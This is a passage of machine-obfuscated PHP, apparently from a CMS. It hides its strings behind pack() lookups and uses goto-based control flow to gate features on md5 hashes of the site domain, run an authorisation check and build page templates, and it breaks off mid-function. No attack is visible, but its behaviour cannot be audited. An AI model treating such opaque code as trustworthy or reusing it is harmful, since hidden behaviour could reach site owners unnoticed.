$I4ueF0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0xE}));
unset($I4utIAA);
$qun2 = $I4ueF0;
goto I4ux14;
I4uldMhx15:
unset($I4utIAA);
$qun2 = $config->qun1;
I4ux14:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x6}));
$I4uAA = $config->qun1_link == $I4ueF1;
if ($I4uAA) goto I4ueWjgx17;
goto I4uldMhx17;
I4ueWjgx17:
$I4ueF0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{15}));
unset($I4utIAA);
$qun1_link = $I4ueF0;
goto I4ux16;
I4uldMhx17:
unset($I4utIAA);
$qun1_link = $config->qun1_link;
I4ux16:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x6}));
$I4uAA = $config->qun2_link == $I4ueF1;
if ($I4uAA) goto I4ueWjgx19;
goto I4uldMhx19;
I4ueWjgx19:
unset($I4ucV1);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx1b;
goto I4uldMhx1b;
I4ueWjgx1b:
$I4ucV1 =& $GLOBALS[JLjsIVv][020];
goto I4ux1a;
I4uldMhx1b:
$I4ucV1 = $GLOBALS[JLjsIVv][020];
I4ux1a:
$I4ueF0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucV1));
unset($I4utIAA);
$qun2_link = $I4ueF0;
goto I4ux18;
I4uldMhx19:
unset($I4utIAA);
$qun2_link = $config->qun2_link;
I4ux18:
unset($I4ucVvP2);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx1e;
goto I4uldMhx1e;
I4ueWjgx1e:
$I4ucVvP2 =& $GLOBALS[JLjsIVv][0x11];
goto I4ux1d;
I4uldMhx1e:
$I4ucVvP2 = $GLOBALS[JLjsIVv][0x11];
I4ux1d:
$I4ueFvP1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvP2));
$I4ueFvP3 = call_user_func_array("md5", array(&$C_fdomain));
$I4uvPAA = $I4ueFvP1 . $I4ueFvP3;
$I4ueF5 = call_user_func_array("md5", array(&$I4uvPAA));
$I4uAB = $config->wuliu == $I4ueF5;
$I4uAF = (bool)$I4uAB;
$I4uAG = !$I4uAF;
if ($I4uAG) goto I4ueWjgx1k;
goto I4uldMhx1k;
I4ueWjgx1k:
unset($I4ucVvP8);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx1i;
goto I4uldMhx1i;
I4ueWjgx1i:
$I4ucVvP8 =& $GLOBALS[JLjsIVv][0x11];
goto I4ux1h;
I4uldMhx1i:
$I4ucVvP8 = $GLOBALS[JLjsIVv][0x11];
I4ux1h:
$I4ueFvP7 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvP8));
unset($I4ucVvPvP10);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx1g;
goto I4uldMhx1g;
I4ueWjgx1g:
$I4ucVvPvP10 =& $GLOBALS[JLjsIVv][0x12];
goto I4ux1f;
I4uldMhx1g:
$I4ucVvPvP10 = $GLOBALS[JLjsIVv][0x12];
I4ux1f:
$I4ueFvPvP9 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvPvP10));
$I4uvPvPAC = $I4ueFvPvP9 . $C_fdomain;
$I4ueFvP12 = call_user_func_array("md5", array(&$I4uvPvPAC));
$I4uvPAD = $I4ueFvP7 . $I4ueFvP12;
$I4ueF14 = call_user_func_array("md5", array(&$I4uvPAD));
$I4uAE = $config->wuliu == $I4ueF14;
$I4uAF = (bool)$I4uAE;
goto I4ux1j;
I4uldMhx1k:I4ux1j:
if ($I4uAF) goto I4ueWjgx1l;
goto I4uldMhx1l;
I4ueWjgx1l:
unset($I4ucV2);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx1n;
goto I4uldMhx1n;
I4ueWjgx1n:
$I4ucV2 =& $GLOBALS[JLjsIVv][19];
goto I4ux1m;
I4uldMhx1n:
$I4ucV2 = $GLOBALS[JLjsIVv][19];
I4ux1m:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucV2));
unset($I4utIAA);
$config->wuliu = $I4ueF1;
goto I4ux1c;
I4uldMhx1l:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x6}));
unset($I4utIAA);
$config->wuliu = $I4ueF1;
I4ux1c:
$I4ueFvP1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{20}));
$I4ueFvP2 = call_user_func_array("md5", array(&$C_fdomain));
$I4uvPAA = $I4ueFvP1 . $I4ueFvP2;
$I4ueF3 = call_user_func_array("md5", array(&$I4uvPAA));
$I4uAB = $config->epay == $I4ueF3;
$I4uAF = (bool)$I4uAB;
$I4uAG = !$I4uAF;
if ($I4uAG) goto I4ueWjgx1s;
goto I4uldMhx1s;
I4ueWjgx1s:
$I4ueFvP5 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{20}));
unset($I4ucVvPvP7);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx1q;
goto I4uldMhx1q;
I4ueWjgx1q:
$I4ucVvPvP7 =& $GLOBALS[JLjsIVv][0x12];
goto I4ux1p;
I4uldMhx1q:
$I4ucVvPvP7 = $GLOBALS[JLjsIVv][0x12];
I4ux1p:
$I4ueFvPvP6 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvPvP7));
$I4uvPvPAC = $I4ueFvPvP6 . $C_fdomain;
$I4ueFvP9 = call_user_func_array("md5", array(&$I4uvPvPAC));
$I4uvPAD = $I4ueFvP5 . $I4ueFvP9;
$I4ueF10 = call_user_func_array("md5", array(&$I4uvPAD));
$I4uAE = $config->epay == $I4ueF10;
$I4uAF = (bool)$I4uAE;
goto I4ux1r;
I4uldMhx1s:I4ux1r:
if ($I4uAF) goto I4ueWjgx1t;
goto I4uldMhx1t;
I4ueWjgx1t:
unset($I4ucV2);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx1v;
goto I4uldMhx1v;
I4ueWjgx1v:
$I4ucV2 =& $GLOBALS[JLjsIVv][19];
goto I4ux1u;
I4uldMhx1v:
$I4ucV2 = $GLOBALS[JLjsIVv][19];
I4ux1u:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucV2));
unset($I4utIAA);
$config->epay = $I4ueF1;
goto I4ux1o;
I4uldMhx1t:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x6}));
unset($I4utIAA);
$config->epay = $I4ueF1;
I4ux1o:
unset($I4ucVvP2);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx1y;
goto I4uldMhx1y;
I4ueWjgx1y:
$I4ucVvP2 =& $GLOBALS[JLjsIVv][025];
goto I4ux1x;
I4uldMhx1y:
$I4ucVvP2 = $GLOBALS[JLjsIVv][025];
I4ux1x:
$I4ueFvP1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvP2));
$I4ueFvP3 = call_user_func_array("md5", array(&$C_fdomain));
$I4uvPAA = $I4ueFvP1 . $I4ueFvP3;
$I4ueF5 = call_user_func_array("md5", array(&$I4uvPAA));
$I4uAB = $config->quan == $I4ueF5;
$I4uAF = (bool)$I4uAB;
$I4uAG = !$I4uAF;
if ($I4uAG) goto I4ueWjgx25;
goto I4uldMhx25;
I4ueWjgx25:
unset($I4ucVvP8);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx23;
goto I4uldMhx23;
I4ueWjgx23:
$I4ucVvP8 =& $GLOBALS[JLjsIVv][025];
goto I4ux22;
I4uldMhx23:
$I4ucVvP8 = $GLOBALS[JLjsIVv][025];
I4ux22:
$I4ueFvP7 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvP8));
unset($I4ucVvPvP10);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx21;
goto I4uldMhx21;
I4ueWjgx21:
$I4ucVvPvP10 =& $GLOBALS[JLjsIVv][0x12];
goto I4ux2z;
I4uldMhx21:
$I4ucVvPvP10 = $GLOBALS[JLjsIVv][0x12];
I4ux2z:
$I4ueFvPvP9 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvPvP10));
$I4uvPvPAC = $I4ueFvPvP9 . $C_fdomain;
$I4ueFvP12 = call_user_func_array("md5", array(&$I4uvPvPAC));
$I4uvPAD = $I4ueFvP7 . $I4ueFvP12;
$I4ueF14 = call_user_func_array("md5", array(&$I4uvPAD));
$I4uAE = $config->quan == $I4ueF14;
$I4uAF = (bool)$I4uAE;
goto I4ux24;
I4uldMhx25:I4ux24:
if ($I4uAF) goto I4ueWjgx26;
goto I4uldMhx26;
I4ueWjgx26:
unset($I4ucV2);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx28;
goto I4uldMhx28;
I4ueWjgx28:
$I4ucV2 =& $GLOBALS[JLjsIVv][19];
goto I4ux27;
I4uldMhx28:
$I4ucV2 = $GLOBALS[JLjsIVv][19];
I4ux27:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucV2));
unset($I4utIAA);
$config->quan = $I4ueF1;
goto I4ux1w;
I4uldMhx26:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x6}));
unset($I4utIAA);
$config->quan = $I4ueF1;
I4ux1w:
unset($I4ucVvP2);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx2b;
goto I4uldMhx2b;
I4ueWjgx2b:
$I4ucVvP2 =& $GLOBALS[JLjsIVv][0x16];
goto I4ux2a;
I4uldMhx2b:
$I4ucVvP2 = $GLOBALS[JLjsIVv][0x16];
I4ux2a:
$I4ueFvP1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvP2));
$I4ueFvP3 = call_user_func_array("md5", array(&$C_fdomain));
$I4uvPAA = $I4ueFvP1 . $I4ueFvP3;
$I4ueF5 = call_user_func_array("md5", array(&$I4uvPAA));
$I4uAB = $config->postage == $I4ueF5;
$I4uAF = (bool)$I4uAB;
$I4uAG = !$I4uAF;
if ($I4uAG) goto I4ueWjgx2h;
goto I4uldMhx2h;
I4ueWjgx2h:
unset($I4ucVvP8);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx2f;
goto I4uldMhx2f;
I4ueWjgx2f:
$I4ucVvP8 =& $GLOBALS[JLjsIVv][0x16];
goto I4ux2e;
I4uldMhx2f:
$I4ucVvP8 = $GLOBALS[JLjsIVv][0x16];
I4ux2e:
$I4ueFvP7 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvP8));
unset($I4ucVvPvP10);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx2d;
goto I4uldMhx2d;
I4ueWjgx2d:
$I4ucVvPvP10 =& $GLOBALS[JLjsIVv][0x12];
goto I4ux2c;
I4uldMhx2d:
$I4ucVvPvP10 = $GLOBALS[JLjsIVv][0x12];
I4ux2c:
$I4ueFvPvP9 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvPvP10));
$I4uvPvPAC = $I4ueFvPvP9 . $C_fdomain;
$I4ueFvP12 = call_user_func_array("md5", array(&$I4uvPvPAC));
$I4uvPAD = $I4ueFvP7 . $I4ueFvP12;
$I4ueF14 = call_user_func_array("md5", array(&$I4uvPAD));
$I4uAE = $config->postage == $I4ueF14;
$I4uAF = (bool)$I4uAE;
goto I4ux2g;
I4uldMhx2h:I4ux2g:
if ($I4uAF) goto I4ueWjgx2i;
goto I4uldMhx2i;
I4ueWjgx2i:
unset($I4ucV2);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx2k;
goto I4uldMhx2k;
I4ueWjgx2k:
$I4ucV2 =& $GLOBALS[JLjsIVv][19];
goto I4ux2j;
I4uldMhx2k:
$I4ucV2 = $GLOBALS[JLjsIVv][19];
I4ux2j:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucV2));
unset($I4utIAA);
$config->postage = $I4ueF1;
goto I4ux29;
I4uldMhx2i:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x6}));
unset($I4utIAA);
$config->postage = $I4ueF1;
I4ux29:
$I4ueFvPvP0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{23}));
unset($I4ucVvP2);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx2n;
goto I4uldMhx2n;
I4ueWjgx2n:
$I4ucVvP2 =& $GLOBALS[JLjsIVv][24];
goto I4ux2m;
I4uldMhx2n:
$I4ucVvP2 = $GLOBALS[JLjsIVv][24];
I4ux2m:
$I4ueFvP1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvP2));
unset($I4ucV5);
if (is_array($_SERVER)) goto I4ueWjgx2x;
goto I4uldMhx2x;
I4ueWjgx2x:
$I4ucV5 =& $_SERVER[$I4ueFvPvP0];
goto I4ux2w;
I4uldMhx2x:
$I4ucV5 = $_SERVER[$I4ueFvPvP0];
I4ux2w:
$I4ueF4 = call_user_func_array("strpos", array(&$I4ucV5, &$I4ueFvP1));
$I4uAA = $I4ueF4 !== false;
$I4uAC = (bool)$I4uAA;
if ($I4uAC) goto I4ueWjgx2v;
goto I4uldMhx2v;
I4ueWjgx2v:
unset($I4ucVvP7);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx2p;
goto I4uldMhx2p;
I4ueWjgx2p:
$I4ucVvP7 =& $GLOBALS[JLjsIVv][0x19];
goto I4ux2o;
I4uldMhx2p:
$I4ucVvP7 = $GLOBALS[JLjsIVv][0x19];
I4ux2o:
$I4ueFvP6 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvP7));
unset($I4ucVvP10);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx2r;
goto I4uldMhx2r;
I4ueWjgx2r:
$I4ucVvP10 =& $GLOBALS[JLjsIVv][26];
goto I4ux2q;
I4uldMhx2r:
$I4ucVvP10 = $GLOBALS[JLjsIVv][26];
I4ux2q:
$I4ueFvP9 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvP10));
$I4ueF12 = call_user_func_array("getrs", array(&$I4ueFvP6, &$I4ueFvP9));
$I4uAB = $I4ueF12 > 2;
$I4uAC = (bool)$I4uAB;
goto I4ux2u;
I4uldMhx2v:I4ux2u:
$I4uAE = (bool)$I4uAC;
if ($I4uAE) goto I4ueWjgx2t;
goto I4uldMhx2t;
I4ueWjgx2t:
$I4ueF13 = call_user_func_array("checkauth", array());
$I4uAD = !$I4ueF13;
$I4uAE = (bool)$I4uAD;
goto I4ux2s;
I4uldMhx2t:I4ux2s:
if ($I4uAE) goto I4ueWjgx2y;
goto I4uldMhx2y;
I4ueWjgx2y:
$I4ueF0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x1B}));
$I4uAA = $I4ueF0 . $url_from;
unset($I4ucV2);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx33;
goto I4uldMhx33;
I4ueWjgx33:
$I4ucV2 =& $GLOBALS[JLjsIVv][0x1C];
goto I4ux32;
I4uldMhx33:
$I4ucV2 = $GLOBALS[JLjsIVv][0x1C];
I4ux32:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucV2));
$I4uAB = $I4uAA . $I4ueF1;
$I4uAC = $I4uAB . $url_from;
unset($I4ucV4);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx31;
goto I4uldMhx31;
I4ueWjgx31:
$I4ucV4 =& $GLOBALS[JLjsIVv][035];
goto I4ux3z;
I4uldMhx31:
$I4ucV4 = $GLOBALS[JLjsIVv][035];
I4ux3z:
$I4ueF3 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucV4));
$I4uAD = $I4uAC . $I4ueF3;
die($I4uAD);
goto I4ux2l;
I4uldMhx2y:I4ux2l:
function tpl($path)
{
    global $C_kefu, $conn, $H_data, $type, $id, $C_title, $C_notice, $fmid, $M_ninfo, $M_pinfo;
    unset($I4ucVvP1);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx36;
    goto I4uldMhx36;
    I4ueWjgx36:
    $I4ucVvP1 =& $GLOBALS[AvLDZrJ][01];
    goto I4ux35;
    I4uldMhx36:
    $I4ucVvP1 = $GLOBALS[AvLDZrJ][01];
    I4ux35:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP1));
    $I4ueF3 = call_user_func_array("is_dir", array(&$I4ueFvP0));
    $I4uAA = !$I4ueF3;
    if ($I4uAA) goto I4ueWjgx37;
    goto I4uldMhx37;
    I4ueWjgx37:
    $GLOBALS["Ox9790"] = ini_get("error_reporting");
    error_reporting(0);
    unset($I4ucVvP1);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx39;
    goto I4uldMhx39;
    I4ueWjgx39:
    $I4ucVvP1 =& $GLOBALS[AvLDZrJ][01];
    goto I4ux38;
    I4uldMhx39:
    $I4ucVvP1 = $GLOBALS[AvLDZrJ][01];
    I4ux38:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP1));
    $I4ueF3 = call_user_func_array("mkdir", array(&$I4ueFvP0, 0755, true));
    $I4ueRAA = $I4ueF3;
    error_reporting($GLOBALS["Ox9790"]);
    goto I4ux34;
    I4uldMhx37:I4ux34:
    $I4ueF0 = call_user_func_array("file_get_contents", array(&$path));
    unset($I4utIAA);
    $html = $I4ueF0;
    $I4ueFvP0 = call_user_func_array("dirname", array(&$path));
    unset($I4ucVvP2);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx3c;
    goto I4uldMhx3c;
    I4ueWjgx3c:
    $I4ucVvP2 =& $GLOBALS[AvLDZrJ][2];
    goto I4ux3b;
    I4uldMhx3c:
    $I4ucVvP2 = $GLOBALS[AvLDZrJ][2];
    I4ux3b:
    $I4ueFvP1 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP2));
    $I4uvPAA = $I4ueFvP0 . $I4ueFvP1;
    $I4ueF4 = call_user_func_array("is_file", array(&$I4uvPAA));
    if ($I4ueF4) goto I4ueWjgx3d;
    goto I4uldMhx3d;
    I4ueWjgx3d:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{0x3}));
    $I4ueFvPvP1 = call_user_func_array("dirname", array(&$path));
    unset($I4ucVvPvP3);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx3f;
    goto I4uldMhx3f;
    I4ueWjgx3f:
    $I4ucVvPvP3 =& $GLOBALS[AvLDZrJ][2];
    goto I4ux3e;
    I4uldMhx3f:
    $I4ucVvPvP3 = $GLOBALS[AvLDZrJ][2];
    I4ux3e:
    $I4ueFvPvP2 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvPvP3));
    $I4uvPvPAA = $I4ueFvPvP1 . $I4ueFvPvP2;
    $I4ueFvP5 = call_user_func_array("file_get_contents", array(&$I4uvPvPAA));
    $I4ueF6 = call_user_func_array("str_replace", array(&$I4ueFvP0, &$I4ueFvP5, &$html));
    unset($I4utIAB);
    $html = $I4ueF6;
    goto I4ux3a;
    I4uldMhx3d:I4ux3a:
    $I4ueFvP0 = call_user_func_array("dirname", array(&$path));
    $I4ueFvP1 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{0x4}));
    $I4uvPAA = $I4ueFvP0 . $I4ueFvP1;
    $I4ueF2 = call_user_func_array("is_file", array(&$I4uvPAA));
    if ($I4ueF2) goto I4ueWjgx3h;
    goto I4uldMhx3h;
    I4ueWjgx3h:
    unset($I4ucVvP1);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx3j;
    goto I4uldMhx3j;
    I4ueWjgx3j:
    $I4ucVvP1 =& $GLOBALS[AvLDZrJ][0x5];
    goto I4ux3i;
    I4uldMhx3j:
    $I4ucVvP1 = $GLOBALS[AvLDZrJ][0x5];
    I4ux3i:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP1));
    $I4ueFvPvP3 = call_user_func_array("dirname", array(&$path));
    $I4ueFvPvP4 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{0x4}));
    $I4uvPvPAA = $I4ueFvPvP3 . $I4ueFvPvP4;
    $I4ueFvP5 = call_user_func_array("file_get_contents", array(&$I4uvPvPAA));
    $I4ueF6 = call_user_func_array("str_replace", array(&$I4ueFvP0, &$I4ueFvP5, &$html));
    unset($I4utIAB);
    $html = $I4ueF6;
    goto I4ux3g;
    I4uldMhx3h:I4ux3g:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{0x6}));
    unset($I4ucVvP2);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx3l;
    goto I4uldMhx3l;
    I4ueWjgx3l:
    $I4ucVvP2 =& $GLOBALS[AvLDZrJ][07];
    goto I4ux3k;
    I4uldMhx3l:
    $I4ucVvP2 = $GLOBALS[AvLDZrJ][07];
    I4ux3k:
    $I4ueFvP1 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP2));
    $I4ueF4 = call_user_func_array("getrs", array(&$I4ueFvP0, &$I4ueFvP1));
    unset($I4utIAA);
    $N_count = $I4ueF4;
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{8}));
    $I4ueFvP1 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{0x9}));
    $I4ueF2 = call_user_func_array("getrs", array(&$I4ueFvP0, &$I4ueFvP1));
    unset($I4utIAA);
    $P_count = $I4ueF2;
    unset($I4ucVvP1);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx3n;
    goto I4uldMhx3n;
    I4ueWjgx3n:
    $I4ucVvP1 =& $GLOBALS[AvLDZrJ][0xA];
    goto I4ux3m;
    I4uldMhx3n:
    $I4ucVvP1 = $GLOBALS[AvLDZrJ][0xA];
    I4ux3m:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP1));
    $I4ueFvP3 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{11}));
    $I4ueF4 = call_user_func_array("getrs", array(&$I4ueFvP0, &$I4ueFvP3));
    unset($I4utIAA);
    $M_count = $I4ueF4;
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{0xC}));
    $I4ueFvP1 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{11}));
    $I4ueF2 = call_user_func_array("getrs", array(&$I4ueFvP0, &$I4ueFvP1));
    unset($I4utIAA);
    $S_count = $I4ueF2;
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{015}));
    unset($I4ucVvP2);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx3p;
    goto I4uldMhx3p;
    I4ueWjgx3p:
    $I4ucVvP2 =& $GLOBALS[AvLDZrJ][14];
    goto I4ux3o;
    I4uldMhx3p:
    $I4ucVvP2 = $GLOBALS[AvLDZrJ][14];
    I4ux3o:
    $I4ueFvP1 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP2));
    $I4ueF4 = call_user_func_array("getrs", array(&$I4ueFvP0, &$I4ueFvP1));
    unset($I4utIAA);
    $L_count = $I4ueF4;
    unset($I4ucVvP1);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx3r;
    goto I4uldMhx3r;
    I4ueWjgx3r:
    $I4ucVvP1 =& $GLOBALS[AvLDZrJ][15];
    goto I4ux3q;
    I4uldMhx3r:
    $I4ucVvP1 = $GLOBALS[AvLDZrJ][15];
    I4ux3q:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP1));
    $I4ueFvP3 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{16}));
    $I4ueF4 = call_user_func_array("getrs", array(&$I4ueFvP0, &$I4ueFvP3));
    unset($I4utIAA);
    $L_sum = $I4ueF4;
    unset($I4ucVvP1);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx3t;
    goto I4uldMhx3t;
    I4ueWjgx3t:
    $I4ucVvP1 =& $GLOBALS[AvLDZrJ][0x11];
    goto I4ux3s;
    I4uldMhx3t:
    $I4ucVvP1 = $GLOBALS[AvLDZrJ][0x11];
    I4ux3s:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP1));
    unset($I4ucVvP4);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx3v;
    goto I4uldMhx3v;
    I4ueWjgx3v:
    $I4ucVvP4 =& $GLOBALS[AvLDZrJ][0x12];
    goto I4ux3u;
    I4uldMhx3v:
    $I4ucVvP4 = $GLOBALS[AvLDZrJ][0x12];
    I4ux3u:
    $I4ueFvP3 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP4));
    unset($I4ucVvP7);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx3x;
    goto I4uldMhx3x;
    I4ueWjgx3x:
    $I4ucVvP7 =& $GLOBALS[AvLDZrJ][023];
    goto I4ux3w;
    I4uldMhx3x:
    $I4ucVvP7 = $GLOBALS[AvLDZrJ][023];
    I4ux3w:
    $I4ueFvP6 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP7));
    unset($I4ucVvPvP10);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx4z;
    goto I4uldMhx4z;
    I4ueWjgx4z:
    $I4ucVvPvP10 =& $GLOBALS[AvLDZrJ][20];
    goto I4ux3y;
    I4uldMhx4z:
    $I4ucVvPvP10 = $GLOBALS[AvLDZrJ][20];
    I4ux3y:
    $I4ueFvPvP9 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvPvP10));
    $I4ueFvP12 = call_user_func_array("date", array(&$I4ueFvPvP9));
    unset($I4ucVvP14);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx42;
    goto I4uldMhx42;
    I4ueWjgx42:
    $I4ucVvP14 =& $GLOBALS[AvLDZrJ][0x15];
    goto I4ux41;
    I4uldMhx42:
    $I4ucVvP14 = $GLOBALS[AvLDZrJ][0x15];
    I4ux41:
    $I4ueFvP13 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP14));
    $I4ueFvPvP16 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{22}));
    $I4uzA17 = array();
    $I4uzA17[$I4ueFvP0] = $html;
    $I4uzA17[$I4ueFvP3] = $H_data;
    $I4uzA17[$I4ueFvP6] = $I4ueFvP12;
    $I4uzA17[$I4ueFvP13] = $_SERVER[$I4ueFvPvP16];
    unset($I4utIAA);
    $data2 = $I4uzA17;
    $I4ueFvPvP0 = call_user_func_array("json_encode", array(&$data2));
    $I4ueFvP1 = call_user_func_array("base64_encode", array(&$I4ueFvPvP0));
    $I4ueF2 = call_user_func_array("md5", array(&$I4ueFvP1));
    unset($I4utIAA);
    $md5 = $I4ueF2;
    $I4ueF0 = call_user_func_array("isMobile", array());
    if ($I4ueF0) goto I4ueWjgx44;
    goto I4uldMhx44;
    I4ueWjgx44:
    unset($I4ucVvP1);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx46;
    goto I4uldMhx46;
    I4ueWjgx46:
    $I4ucVvP1 =& $GLOBALS[AvLDZrJ][0x17];
    goto I4ux45;
    I4uldMhx46:
    $I4ucVvP1 = $GLOBALS[AvLDZrJ][0x17];
    I4ux45:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP1));
    unset($I4utIAA);
    $t = $H_data[$I4ueFvP0];
    goto I4ux43;
    I4uldMhx44:
    unset($I4ucVvP1);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx48;
    goto I4uldMhx48;
    I4ueWjgx48:
    $I4ucVvP1 =& $GLOBALS[AvLDZrJ][0x18];
    goto I4ux47;
    I4uldMhx48:
